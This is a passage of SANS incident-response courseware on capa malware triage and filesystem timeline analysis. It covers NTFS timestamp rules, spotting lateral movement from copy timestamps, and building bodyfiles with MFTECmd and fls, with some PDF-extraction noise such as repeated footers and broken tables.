Imagine running capa on a legitimate copy of powershell.exe. capa would tell you that PowerShell has the
capability to interact with the registry, terminate processes, read and write files, etc. You can see how it would
be easy to jump to conclusions. Thus, it is important to pair this information with other suspicious data points
that led you to the file like it not having a valid digital signature or having highly entropic characteristics. A
malicious file will typically fail multiple different checks on its legitimacy.
In the example on this slide, we see capa analyzing the ever-popular Poison Ivy remote access tool. The antidebugging/analysis characteristics of this sample are a good indication of malicious intent as they do not appear
very commonly in legitimate software. The same goes for the “contain an embedded PE file” and “compiled
with Borland Delphi” capabilities. Gaining more experience with malware characteristics can help you better
utilize a tool like capa. So, feel free to run it on the variety of samples we come across in this class and those
you collect in your own investigations!
[1] GitHub – MBCProject: https://for508.com/2w3sa

16

© 2023 SANS Institute

.

16

Optional Homework
Lab 4.1
Malware Discovery
Average Time: 25 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

17

.

This page intentionally left blank.

© 2023 SANS Institute

.

17

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

18

© 2023 SANS Institute

.

18

Timeline Analysis Overview

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

19

.

This page intentionally left blank.

© 2023 SANS Institute

.

19

Timeline Benefits
Examine System Activity
Around Time of Incident

Detect C2 Channels
Extremely Hard for AntiForensics to Succeed—Too
Many Time Entries
Adversaries Leave Footprints
Everywhere on System

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Timeline analysis has grown to be one of the more powerful techniques to speed up analytical work in digital
forensics and incident response. It allows an investigator to automatically assemble artifacts from the registry,
filesystem, and operating system in temporal order via a single tool. The power of timelining is seeing the
interaction of artifacts and the result is a sequence of events telling a story of what happened on a system during
a specific time frame. However, unlocking the power requires a skilled analyst able to infer the meaning of
groups of artifacts. With practice, timeline analysis gives an investigator the best possible method to quickly
assemble the pieces of a puzzle and answer important forensic questions.
Timeline data can be extremely beneficial when tracking adversary activity during intrusions. Because data is
sourced from the operating and filesystem and not the network level, encryption and even covert tunnelling are
irrelevant. It doesn't matter if the network level is encrypted, as the user must eventually interact with the
system. Anything a user accomplishes will interact with the system somehow (opening files, starting programs,
creating a socket, deleting files, or even anti-forensics) leaving behind artifacts to analyze .
Occasionally you may hear it stated that timelines are not to be trusted due to anti-forensics. This is a narrow
view of how much time-based data actually exists on an operating system. It is nearly impossible for a
determined hacker to delete all their footprints on the system. There are just too many. In addition, even if
hackers have access, they usually have to bring their anti-forensics tools with them. Moving tools to a machine
to delete data that leaves a new trail to detect—the anti-forensic tools themselves. As a result, try to think
through this riddle. If a hacker uses a file wiper to wipe files what will the hacker use to wipe the wiper’s
existence?

20

© 2023 SANS Institute

.

20

Timeline Utopia

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

21

When you start your journey with timeline analysis, it sounds like it will be as easy as tracking footprints in the
snow. It seems that it could be the answer to every forensic problem analysts have faced over the past decade of
performing digital forensics. While timelines can answer many questions, the reality of timeline analysis is far
different.

.

Even though you may be tracking a single user interacting with a machine, you might have multiple users to
contend with. You also need to separate the frequent background system process and account interactions (e.g.,
System, Local Service, and Network Service). You might also need to contend with remote users and legitimate
administrative activity. While “timeline utopia” does occur, the reality is often far messier.

© 2023 SANS Institute

.

21

Timeline Analysis: The Reality

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Most systems have multiple internal accounts, processes, and more creating constant time-related events. This
“noise” makes tracking a specific series of events much more difficult. However, there’s hope. Most activity
will be independent of one another. Think of it as listening to three different types of music at once, classical,
jazz, and rock. The combination might sound like a cacophony of noise, but with some effort you learn to pick
out the classical threads. Similarly, we will be picking out the threads of activity related to the account or
person we are investigating. A wealth of activity is tied directly to user accounts. It is unlikely the “SYSTEM”
user itself will suddenly pop open a browser and start chatting with friends on Facebook. We may be able to
determine interactive sessions versus remote sessions. The reality of examining many different transactions
caused by multiple users, internal processes, automated tasks, and uninvited guests is a challenge, but not an
insurmountable one. This section will teach the skills necessary to analyze timelines effectively.

22

© 2023 SANS Institute

.

22

The Windows Forensic Trinity

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

23

There is a tremendous amount of knowledge required to accomplish and analyze a super timeline effectively.
The three core areas of focus are filesystem metadata, windows artifact data, and Windows registry information.
Understanding all three areas and how they interrelate is a skill worth working towards.

.

The stronger your forensic background, the more information you can mine from timeline analysis. If you do
not know the significance of a LNK file, then you understandably will not be able to use it within a timeline as
an indication of file or folder opening. In this section we will start slow, focusing initially on filesystem
metadata and then eventually adding in the rest. If you are new to forensics, it would be worth your time to
review SANS Windows Forensic Analysis Poster, much of which is included in the following notes pages.
Eventually adding the SANS FOR500 Windows Forensics course to your repertoire will provide a huge boost to
your timelining capabilities.

© 2023 SANS Institute

.

23

Windows Forensics Artifact Review
Program
Execution

Prefetch

ShimCache

AmCache

UserAssist

SRUM

File
Opening

Shortcut Files

Jump Lists

ShellBags

Prefetch

OpenSaveMRU

File
Knowledge

WordWheelQuery

Last Visited MRU

Sho rtcut Files

Recycle Bin

Typed Paths

Event Logs

User Logons

RDP Usage

Run As Events

Process Tracking

PowerShell Logs

Browser
Usage

History

Cookies

C ache

Session Restore

TypedURLs

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

It is much easier to detect systems with active malware than systems with only left-over residue. Because
systems cleaned or compromised with living-off-the-land techniques often require deep dive forensics, the
enormity of the analysis across an enterprise is daunting. However, in practice, detection is the same as systems
with active malware—find traces of attacker activity and scan the enterprise looking for those same fragments.
It just turns out the fragments are harder to find on these systems. Hackers change their profile, but not often
enough that their profile will be completely unique on each system. Forensic analysis is very important in this
phase of the investigation to identify the patterns of attacker activity. As seen on this slide, we have an
enormous set of forensic artifacts used to detect activity of interest on a system. Forensic skills for intrusion
scenarios are very similar to those required for tracking other crimes.
This class assumes some familiarity with what we call, “conversational forensics.” For example, if we are
determining whether malware was executed on a machine, I might mention, “I looked at the prefetch folder for
malware execution and found nothing in the UserAssist key. However, I did find some evidence in the
ShellBags that might be useful for our damage assessment.” Conversational forensics means you are familiar
with most of the terms, and although you might not have them all memorized, a quick mention of the artifact
reminds you of what it tells us. If you are not at this level yet, never fear! The Windows Forensic Analysis
poster from the SANS FOR500 is here to help. It is a terrific resource to reference as we go through this class
and when you perform these investigations for real. You can find it in your course dropbox and downloadable
online. Some of the techniques taught in this class become even more powerful as you develop a deeper forensic
skillset. SANS FOR500 is the “other half” of this class and would be a great follow-on when you are ready to
take your deep-dive forensic skills to the next level.

24

© 2023 SANS Institute

.

24

.
© 2023 SANS Institute

.

25

The Pivot Point
Challenge: Where do I begin to look?
• Use your scope and case knowledge to help form that answer
• A timeline has many places where critical activity has occurred
• Called a timeline pivot point
Pivot Point: Point used to examine the temporal proximity in the timeline
• Temporal Proximity: What occurred immediately before and after a specific event?
Why a pivot point?
• Use the pivot to look before and after in your timeline to get a better idea of what
happened on the system
• Example: Program execution followed by multiple writes to C:\Windows\System32 and
updating registry entries
• You can also use the “pivot point” to help identify potential malware by finding
suspicious files and finding how they interact with the system via the timeline
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Proper analysis is the essential component of successful investigations. We don’t recover a bunch of artifacts,
identify some deleted items, paste them into a report, and hand them to a prosecutor or management. We need to
recover the artifacts and analyze the data they hold to provide a clear picture of what users were doing, when
they were doing it, why, and many other details that can go unnoticed without a trained eye examining them.

.

Timeline analysis can be overwhelming at first. There are so many artifacts, entry types, and fields you must
master, often resulting in a glassy-eyed analyst staring at the screen trying to make heads or tails of a data set.
The secret to success is having a good starting point. To get through the millions of lines of data present in a
timeline you must have a good idea of what you are looking for. We call this a “pivot point.” This is a relevant
point (file, time, artifact) found in the timeline that can be examined to determine what happened before and
after that instance. Many refer to this as a “Temporal Proximity” examination.

26

© 2023 SANS Institute

.

26

How Do You Determine the Pivot Point?
Time of Incident

• SIEM/IDS/AV alert
• 3rd Party Notification

Network Activity

• Malicious URLs accessed
• DNS requests for bad domains
• Running process related to incident
• DLL injection detected

Process Activity
Name of a File
User
Account
Activity

• File name of interest: (p.exe, ri.exe)
• File type of interest (.rar, .py, .ps1)
• Identify suspicious user account activity

• Lateral Movement (Event Logs + File Copy + Execution)
• Anti-Forensics (Wiper download, wiper execution)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

27

.

This chart contains only a small list of possible pivot points available to be used in timeline analysis. An analyst
might start with the estimated time of the incident as provided by a security tool and examine what happened on
the system at that time. In other instances, such as intellectual property theft or investigations with known
malware, it is useful to pivot around a specific filename within the timeline. Related to this is looking for a
specific file type (for example, Excel spreadsheets or RAR archives). What about any newly created .exe and
.dll files in the C:\Windows\System32 folder? Or event log entries indicating suspicious account activity and
lateral movement to a C$ administrative share?
The number of pivot points is endless and driven by whatever knowledge you have of the investigation. As you
learn more, you can identify additional pivot points. For each pivot point, plan to review activity both before
and after, as it is rare to stumble upon just a single artifact of interest on a system.

© 2023 SANS Institute

.

27

Timeline Context Clues

• Recovering a single artifact is similar to recovering
a single word
• Seeing the context surrounding the artifact is
needed to accurately use timeline
• Example ->
•
•

• Sweet = kind and friendly

• Sweet = a taste similar to sugar

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Timeline analysis is unlike traditional data extraction focusing on recovery of a single artifact of data.
Identifying a single artifact is simply not enough to understand the part it plays in the larger context of an
investigation. This concept is known as artifact temporal proximity. A single artifact might not make sense in
the context presented alone, but in the middle of other artifacts it might take on a brand-new meaning.
To highlight what we mean, we can describe the artifact we recover as a single word in a sentence. In this case,
we could recover the word “sweet”. As we know, the utilization of the word sweet has multiple meanings.
- "Sarah is such a sweet little girl; she's always looking after her brother.”
Sweet = kind and friendly.
- "This tea is too sweet for me to drink! How much sugar is in it?"
Sweet = a taste similar to sugar.

1
2

The same can occur in timelines with a single artifact. Finding a single artifact is not enough; the analyst needs
to examine the temporal proximity of the artifact to determine more detailed information as to what it might
represent. You should look at the artifacts in your timeline before and after. You might see evidence of
execution of a program, a file being opened, or files deleted. Artifacts do not simply appear or launch
themselves as programs without additional interaction. Like Mufasa said in the Lion King, “Everything is
connected.” The same is true here.

28

© 2023 SANS Institute

.

28

Comparison of Timeline Capabilities

Super Timeline: log2timeline

Filesystem: fls or MFTECmd

• Obtain everything (Kitchen Sink)
• Filesystem metadata
• Artifact timestamps
• Registry timestamps

• Filesystem metadata only
• More filesystem types
• Apple (HFS)
• Solaris (UFS)
• Linux (EXT)
• Windows (FAT/NTFS)
• Wider OS/Filesystem capability

• Windows, Linux, and Mac

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

29

de

We will cover two different methods to create a timeline of events on a system, using the tools fls,
MFTECmd, and log2timeline.

hi

The original filesystem-focused method uses the Sleuthkit tool fls or newer MFTECmd to extract only the
metadata from the filesystem. Name, path, timestamps, and file size are primary components of a filesystem
timeline. These timelines are simple and fast to generate, making them ideal for rapid analysis or analysis at
scale. They also provide the greatest filesystem flexibility, capable of extracting timeline data from Apple,
Solaris, Linux, CD-ROMS, and of course, Windows-based filesystems.
Super timelines extract a much wider set of data from the target system. In addition to filesystem metadata, they
often include operating system artifacts, logs, browser activity and specialized artifacts like the Windows
registry. The most famous super timeline tool is Plaso which is commonly interacted with via the tool
log2timeline.py. While very powerful, super timelines can take a long time to create and the amount of
data they contain can be overwhelming. For years, Plaso was focused only on Windows forensics, but recent
additions to the project have added significant support for Linux, Android, and Mac systems.

© 2023 SANS Institute

.

29

Timeline Analysis Process
Determine Timeline Scope: What questions do you need to
answer?
Narrow Pivot Points
• Time-based
• Artifact-based
Determine the Best Process for Timeline Creation
• Filesystem-Based Timeline Creation – FLS or MFTECmd – FAST (TRIAGE MODE)
• Super Timeline Creation – Automated or Targeted – LOG2TIMELINE

Filter Timeline

Analyze Timeline
• Focus on the context of evidence
• Use Windows Forensic Analysis Poster “Evidence of…”

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Determine Timeline Scope through analysis of the key questions and the case type. Generally, you can identify
that the activity occurred between date A and date B. Narrowing the scope will be important in managing your
overall data.

.

Narrow Pivot Points through determining the closest time around when you think the incident occurred (timebased) ,or identifying a key file, user account, or other artifact that might have been used in the activity in
question (artifact-based).
Determine the Best Process for Timeline Creation by looking at what data sources you need. A super timeline
is preferred if you do not know what you are looking for and you might need to include everything. However, if
you can predict the data necessary to solve your case, a targeted super timeline or filesystem timeline might
suffice.
Filter Timeline using your scope, de-duplicate, and eliminate data you do not need to examine. Consider using
keywords to identify relevant data (pivot points) for your analysis.
Analyze Timeline through focusing on the context of evidence discovered. Look before and after each pivot
to determine user activity. Use the Windows Forensic Analysis Poster “Evidence of” items to help with
analysis.

30

© 2023 SANS Institute

.

30

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

31

.

This page intentionally left blank.

© 2023 SANS Institute

.

31

Filesystem Timelining

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

32

© 2023 SANS Institute

.

32

Triage Filesystem Timeline Overview

Tools Will Parse:

Collect Times From:

Filesystem metadata
• Directories
• Files
• Deleted files
• Unallocated
metadata

• Data Modified (M)
• Data Access (A)
• Metadata Change (C)
• File Creation (B)

Timelines Can Be
Created For Many
Filesystem Types:
• NTFS
• FAT12/16/32
• EXT2/3/4
• ISO9660 -CDROM
• HFS+
• UFS1&2

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

33

The original and most common type of timeline is the Filesystem Timeline. The filesystem timeline collects
data from all the files and directories in a volume. This will include both allocated and unallocated metadata
structures, with the latter providing knowledge of deleted and orphan files within the filesystem.

.

Every filesystem uses different types of timestamps. The most common timestamps record data modification
(m-modification), data access (a-access), metadata change time (c-change), and file creation (b-birth). The
combination of these timestamps will mean many things and could possibly tell the investigator when a file was
created on a volume, copied to a location, or deleted.
A big advantage of filesystem timelines is their ability to be created across a wide range of filesystem types.
You never know if you might be examining a GPS device embedded with a Linux filesystem or a dual-boot
system that uses both NTFS and HFS+ (Mac in bootcamp mode). The filesystem types that can be parsed with
our current filesystem timeline tools include:
•
•
•
•
•
•

NTFS
FAT12/16/32
EXT2/3/4
ISO9660 -CDROM
HFS+
UFS1&2

© 2023 SANS Institute

.

33

Windows NTFS Timestamps

-

Data Content Change Time

• Time the data content of a file was last modified

-

Data Last Access Time

• Approximate Time when the file data was last accessed

-

Metadata Change Time

• Time this MFT record was last modified

-

File Creation Time

• Time file was created in the volume
File
System

Time
Stored

NTFS

UTC

Time Resolution

M

A

C

B

100 ns since Jan
MFT
Modified
Accessed
Created
1, 1601
Modified
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

NTFS stores four significant filesystem times for files and directories: last modification time (M), last access
time (A), last modification of the MFT record (C), and file creation time (B). The hardest timestamp for many
students to grasp is metadata change time (C). Changes to this timestamp occur when a file is renamed, the file
size changes, security permissions update, or if file ownership is changed.[1] Access (A) times have also been
historically difficult to interpret because so many actions can lead to an update of this timestamp. Even
Windows has historically not given much priority to this timestamp with some versions of the operating system
delaying updates to the last access time by up to 1 hour. Furthermore, some Windows versions do not update last
access timestamps at all. Unless you have a very specific reason to do otherwise, we recommend primarily
focusing on the modified (M) and created (B) times in your investigations. These two timestamps are well
understood and well suited to answering most time-based forensic queries.
Luckily, the NTFS filesystem stores time values in UTC format, so they are not affected by changes in time
zone or daylight savings time. Amazingly, this is not always the case with other file systems. The FAT
filesystem stores time values based on the local time of the computer. So as an example, a file that is saved at
3:00 PM PST in California is seen as 6:00 PM EST in New York on an NTFS volume, but it is (incorrectly) seen
as 3:00 PM EST in New York on a FAT volume.
The time format used by NTFS is a 64-bit FILETIME data structure, storing timestamps as the number of
hundreds of nanoseconds since 12:00 Jan 1, 1601, UTC.[2] While this seems unusual, the exceptionally high
time resolution is a boon to Windows forensics (UNIX stores dates as the number of seconds since Jan 1, 1970).
A lot can happen on a system within one second, so the extra granularity can help put findings into proper
context.
[1] File Times (Windows) http://for508.com/nep4l
[2] FILETIME structure (Windows) http://for508.com/sucit

34

© 2023 SANS Institute

.

Windows Time Rules

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

35

.

This slide has been a work in progress for many years. Tracking the vagaries of different actions on different
timestamps across different versions of Windows is enough to drive anyone to madness. That being said, this
slide contains a reasonable expectation of how different actions affect timestamps under normal conditions. We
recommend using it as a guideline and not gospel truth because there are hundreds of different ways to do the
same thing in Windows and not all of them have been tested. If you ever find yourself in a situation where the
provenance of a timestamp is crucial, we always recommend testing your hypothesis (multiple times) on a close
approximation to the original system.
Notice how each action affects the four timestamps present in Windows NTFS file systems (MACB). Several of
the results make sense. When a file is created, its timestamps must be set to something, so all four timestamps
are set to the time of creation. File access timestamp updating was disabled in Windows Vista only to be reenabled in later versions of Windows 10 and 11. Though access times were not completely disabled in those
earlier operating systems, and many exceptions like copying and moving could still affect them. For reasons like
this, we recommend ignoring access times in most cases because they are so inconsistent and hard to pin down.
File modifications need to read the data, change the data, and update the file size, affecting M, A, and C times.
A file rename and a local file move only really affect the metadata of a file (the name and parent folder
respectively), so only C time is updated. Windows has no deletion time and hence no timestamps are updated
when a file is deleted.
It gets a little more interesting when looking at file copying and volume file moves. The most important pattern
to recognize on this slide is modified times being inherited from the original file, particularly with a copy and a
volume file move via the command line (CLI). In these two situations, we will have a unique pattern – the files
will have a modified time pre-dating their creation, which should not be possible. This pattern is an excellent
indicator that the files came from somewhere else, and the creation time tells us when the copy or move
occurred. Since filesystems do not tend to have “copy” artifacts, this strange set of timestamps is a very
important indicator to understanding the movement of files. Interestingly, timestamps update differently for
moves conducted via a cut and paste in the GUI desktop versus the command line, a great example of the
complexity of trying to track and understand timestamp updating.

© 2023 SANS Institute

.

35

.
36

© 2023 SANS Institute

.

Windows Time Rules

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

37

.

As if timestamp rules were not complicated enough, they can also vary according to the version of Windows
operating system! In this slide, we demonstrate the (minor) differences between Windows 10 and 11 systems.
Undoubtedly, there will be more behavior changes in the future. Our advice is to not over complicate things.
Creation (a new file appeared) and modified (a file was updated) times are usually sufficient to answer most
forensic questions. If you compare the Windows 10 and 11 changes, you will see only minor updates to Access
and Metadata Change times and no changes to the behavior of creation and modified timestamps. This is good
news and means our day-to-day analysis should be largely identical on both types of systems. In the rare case
you need to go deeper, these charts can help guide you in creating a hypothesis (including other contextual
artifacts) which can then be tested on a like system.
Kathryn Hedley, a DFIR instructor at SANS, performed extensive testing on Windows 10 and 11 timestamps in
support of the time rules graphics seen here. Her testing is documented on her website where she continues to
post updates and changes as they become available.[1]
[1] Khyrenz Windows 11 Time Rules: https://for508.com/otuay

© 2023 SANS Institute

.

37

.
38

© 2023 SANS Institute

.

Additional Time Rule Exceptions
Applications
• Office products
• WinZip

Anti-Forensics
• Timestomp
• Touch
• Privacy cleaners

Archives
• ZIP, RAR, and TGZ
• Retains original date/timestamps
• Usually affects modified time only

Scanning
• Depends on how well the anti-virus is written

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

39

.

Modern operating systems and the applications running on top of them are extremely complicated. There are
myriad actions that might change times in such a way as to break the “standard” time updating rules. Here we
try to collect some of the most common offenders. Microsoft Office has long had the habit of updating access
times, even when access time updates are turned off in the registry. Malware and anti-forensic tools can
leverage file system APIs to change timestamps to better blend in with existing files or destroy evidence. Most
archiving software backdates the modification time of unzipped files to the time the dates were previously when
the archive was created (making it look like a file copy). Finally, your own security software might be scanning
or interacting with files and causing timestamp updates. Many anti-virus products used to update access
timestamps every day when they performed their scans. In summary, timestamp interpretation should always be
done in context with any other actions that could help explain the changes. When in doubt, test your hypothesis!

© 2023 SANS Institute

.

39

Understanding Timestamps: Lateral Movement Analysis
1. PA.EXE transferred
via file share (net use)

On Target PA.EXE
• Created:
•
2018­04­03 22:59:43
• File Modified:
•
2018­04­03 22:53:39
PA.EXE
Created After Last
Modification

2. PA.EXE executed
via scheduled task or
PSEXEC

File was copied at file’s
creation time.
Creation Time = Time of
teral movement
la

Target System

Compromised
System

Use Creation Time as
“Pivot Point” in timeline
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

One of the more interesting aspects of timestamp analysis is timestamps adhere to the same rules even when
communicating over the network via something like a network share (assuming both filesystems are NTFS). A
common lateral movement technique is to transfer a file to the targeted host and execute it via a scheduled task,
WMI command, or the PsExec tool. Many of these techniques employ a “net use” session, connecting to the
targeted filesystem using SMB with valid credentials. The file is “copied” to the remote system and timestamps
are transferred along with the file (SMB file transfers seen in network PCAP traffic also show these
timestamps). From the point of view of the operating system, a remotely mounted filesystem looks nearly
identical to a locally mounted one. This is one of the reasons the “mountpoints2” NTUSER.DAT registry key
under each user account is a good source to identify both local and remotely mounted volumes.
When a file is copied over the SMB connection of a file share, the modification time will be inherited from the
original, as we would expect. A new creation time will be assigned to the transferred file. Thus, the
modification time will pre-date the creation (indicating a copy) and the creation time is the time the file was
copied to the target host! This is a tremendous win and very useful for tracking file movements. As an
example, how often would you expect an .exe file to exhibit characteristics of copying? This creation time, or
“time of file copy”, can also be used as a “pivot point” when analyzing the remote system’s timeline. Parsing
nearby event log entries should show the associated accounts used and application execution events might
provide more details into any malware executed. The bottom line: finding clever pivot points can come from a
simple understanding of the mechanics of filesystem timestamps.

40

© 2023 SANS Institute

.

40

Understanding the Filesystem Timeline Format
Underst

To interpret a timeline, you must understand the columns:
•
•
•
•
•
•
•

Time: All entries with the same time are grouped
macb: Indication of timestamp type
File Size
Permissions (Unix only)
User and Group (Unix Only)
Meta: Metadata address ($MFT record number for NTFS)
File Name
• Deleted files are appended with “(deleted)”
Timestamp

macb

File Size

Meta

File Name

2021–10-03 16:20:37
2021-11-04 18:46:51

m.c.
.a.b

20452
20452

80932
80932

C:\calc.exe
C:\calc.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

41

hi

de

Learning to interpret a timeline takes practice. The “body” file format of a filesystem timeline has up to eight
columns (five are seen here). The first column represents the timestamp itself delineated to the closest second.
A lot can happen on a system within a second and thus events happening very close to one another (within the
second granularity) may be out of order. This is usually unimportant or easy for the analyst to discern.
The “macb” column is by far the hardest (and most important) to understand. This column tells us the specific
time value that relates to the timestamp in column one. And it can be more than one. A combination of the
letters M,A,C, and B will be present in the column, representing modification, access, metadata change, and
birth. In this example on the slide, we see two timeline entries for the same file (C:\calc.exe). The first entry
has the value “m.c.” in its “macb” column. This means the modification and metadata change times for this
file are the same, and both are represented by the time in column one (2021-10-03 16:20:37). Similarly, the
second line on the slide indicates the access and birth times of the file are the same, via the “macb” column
value of “.a.b”. This could be the hardest part of timelines to grasp because there are four timestamps per file,
you could have up to four separate entries in your timeline for each file. In our example, we have a total of two
entries in the timeline because the modification and metadata change times match, while the access and birth
times also match, but at a different time. The entries in the “macb” column will always be in the same order, and
any missing timestamps are represented by a period, “.” value. Some additional examples:
•
•
•

m.cb (modified, metadata changed, birth)
.a.. (accessed)
mac. (modified, accessed, metadata changed)

Remember, we only have the last time for each of these timestamps. As an example, we only have the last
modification time (M) for a Word document, not every time it was modified. This means we do not have
historical timestamp information, and this is one example of how evidence can age out over time (i.e., the next
time that Word document gets updated, its M time will also get updated, erasing the previous modification time).
File size can be helpful when trying to match files with the same size or when looking for very large files like
archives or encrypted volumes.
The “Meta” column is the metadata address for the data structure where the data was sourced. In the case of
© 2023 SANS Institute

.

41

Windows NTFS, this column represents the $MFT record number. In the case of a Linux filesystem this would
represent the inode number. We will be using this information later when we dig deeper into MFT records.
The “File Name” column contains full path information for the file. Any currently unallocated file will have
(deleted) appended to this column value. This column is one of the most commonly used for filtering, given the
file name and path information contained.

.

Security and ownership information for the file can be found in the “Permissions” and “UID”, and “GID”
columns. These columns are only relevant for Unix-based filesystems as Windows does not represent
permissions and ownership in this way. We typically hide these columns during the analysis of Windows
systems.

42

© 2023 SANS Institute

.

Create Triage Timeline Bodyfile Step 1: MFTECmd.exe
C:\> MFTECmd.exe -f “E:\C\$MFT” --body “G:\timeline” --bodyf mft.body --blf --bdl C:
MFTECmd.exe -f “<file>” --body “<dir>” --bodyf file.body --blf --bdl C:

-f “<filename>”
--csv “<dir>”

= $MFT|$J|$Boot|$SDS to process
= Dir to save CSV (tab separated)

--csvf name

= Filename to save CSV

--body “<dir>”
--bodyf name
--bdl name

= Dir to save CSV
= Filename to save CSV
= Drive letter (C, D, etc.) to
use with bodyfile
= When true, use LF vs CRLF for
newlines. Default is FALSE

--blf

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

43

.

Eric Zimmerman has done it again—producing a program (MFTECmd) that is extremely efficient at extracting
data from $MFT (Master File Table) files, filesystem journals, and several other NTFS system files.[1] To create
our filesystem timeline, we will be using MFTECmd to extract data into timeline (bodyfile) format. MFTECmd
easily extracts the contents of a $MFT file into a format that can be easily filtered and made human-readable
using a program we will introduce you to called mactime.
MFTECmd can also be used to output MFT metadata to CSV format. The CSV output format allows much
more detail to be included and can be a great supplement to your timeline. To see the difference, use “--csv”
instead of “--body”:
MFTECmd.exe -f “E:\C\$MFT” --csv “G:\timeline” --csvf mft.csv
MFTECmd.exe --help
Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd
Examples: MFTECmd.exe -f "C:\Temp\SomeMFT" --csv "c:\temp\out" --csvf MyOutputFile.csv
MFTECmd.exe -f "C:\Temp\SomeMFT" --csv "c:\temp\out"
MFTECmd.exe -f "C:\Temp\SomeMFT" --json "c:\temp\jsonout"
MFTECmd.exe -f "C:\Temp\SomeMFT" --body "c:\temp\bout" --bdl c
MFTECmd.exe -f "C:\Temp\SomeMFT" --de 5-5
Usage:
MFTECmd [options]
Short options (single letter) are prefixed with a single dash. Long commands are prefixed with two dashes

© 2023 SANS Institute

.

43

.

Options:
-f <f>
File to process ($MFT | $J | $Boot | $SDS | $I30). Required
-m <m>
$MFT file to use when -f points to a $J file (Use this to resolve parent path in $J CSV output).
--json <json> Directory to save JSON formatted results to. This or --csv required unless --de or --body is
specified
--jsonf <jsonf> File name to save JSON formatted results to. When present, overrides default name
--csv <csv>
Directory to save CSV formatted results to. This or --json required unless --de or --body is
specified
--csvf <csvf> File name to save CSV formatted results to. When present, overrides default name
--body <body> Directory to save bodyfile formatted results to. --bdl is also required when using this option
--bodyf <bodyf> File name to save body formatted results to. When present, overrides default name
--bdl <bdl>
Drive letter (C, D, etc.) to use with bodyfile. Only the drive letter itself should be provided
--blf
When true, use LF vs CRLF for newlines [default: False]
--dd <dd>
Directory to save exported FILE record. --do is also required when using this option
--do <do>
Offset of the FILE record to dump as decimal or hex. Ex: 5120 or 0x1400 Use --de or --debug
to see offsets
--de <de>
Dump full details for entry/sequence #. Format is 'Entry' or 'Entry-Seq' as decimal or hex.
Example: 5, 624-5 or 0x270-0x5.
--dr
When true, dump resident files to dir specified by --csv, in 'Resident' subdirectory. Files will be
named '<EntryNumber>-<SequenceNumber>_<FileName>.bin'
--fls
When true, displays contents of directory specified by --de. Ignored when --de points to a file
[default: False]
--ds <ds>
Dump full details for Security Id as decimal or hex. Example: 624 or 0x270
--dt <dt>
The custom date/time format to use when displaying time stamps. See https://goo.gl/CNVq0k for
options [default: yyyy-MM-dd HH:mm:ss.fffffff]
--sn
Include DOS file name types [default: False]
--fl
Generate condensed file listing. Requires --csv [default: False]
--at
When true, include all timestamps from 0x30 attribute vs only when they differ from 0x10 [default:
False]
--rs
When true, recover slack space from FILE records when processing MFT files. This option has no
effect for $I30 files [default: False]
--vss
Process all Volume Shadow Copies that exist on drive specified by -f [default: False]
--dedupe
Deduplicate -f & VSCs based on SHA-1. First file found wins [default: False]
--debug
Show debug information during processing [default: False]
--trace
Show trace information during processing [default: False]
--version
Show version information
-?, -h, --help Show help and usage information
[1] https://github.com/EricZimmerman/MFTECmd

44

© 2023 SANS Institute

.

Create Triage Timeline Bodyfile Step 1 (alternate) : fls -m
fls -r -m C: /cases/cdrive/cdrive.E01 > /cases/cdrive/out.bodyfile

fls [options] image [inode]
[Useful Options for fls]
-d:
Display deleted entries only
-r:
Recurse on directories
-p:
Display full path when recursing
-m:
Display in timeline bodyfile format
-s <sec>: Timeskew of system in seconds
• The fls tool allows us to interact with a forensic image as though it were a
normal filesystem
• The fls tool in The Sleuth Kit can be used to collect timeline information from
the filename layer
• It takes the inode value of a directory, processes the contents, and displays the
filenames in the directory (including deleted items)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

45

.

The Sleuth Kit (TSK) is one of the original open-source forensic tools and is used by a vast number of other tool
suites (free and commercial) to parse file systems. The fls tool within the TSK suite is designed to extract
filename and metadata information for files. By providing the “-m” option, we can tell the tool to output this
information in the common “bodyfile” timeline format, which is the first step of timeline creation. There are
three different types of data to collect:
1. Allocated files are normal active files one would see when performing a directory listing.
2. Deleted files are unallocated files whose name structures still exist. Depending on the filesystem, the
metadata of deleted files can still contain full path information and details such as times and
permissions.
3. Orphan files represent data from unallocated metadata structures where the parent folder information
no longer exists. We know a file with a specific name and set of timestamps once existed in the
filesystem, but do not know in what folder it was present in.
A significant difference between fls and MFTECmd is fls is designed to extract metadata information using
an image of a filesystem volume (i.e., the entire C: drive), while MFTECmd uses just the $MFT file for the C:
drive providing timelining capability in times when a disk image is not available or feasible. On the other hand,
fls can parse many more filesystems than just NTFS, while MFTECmd supports NTFS-only. Note that fls
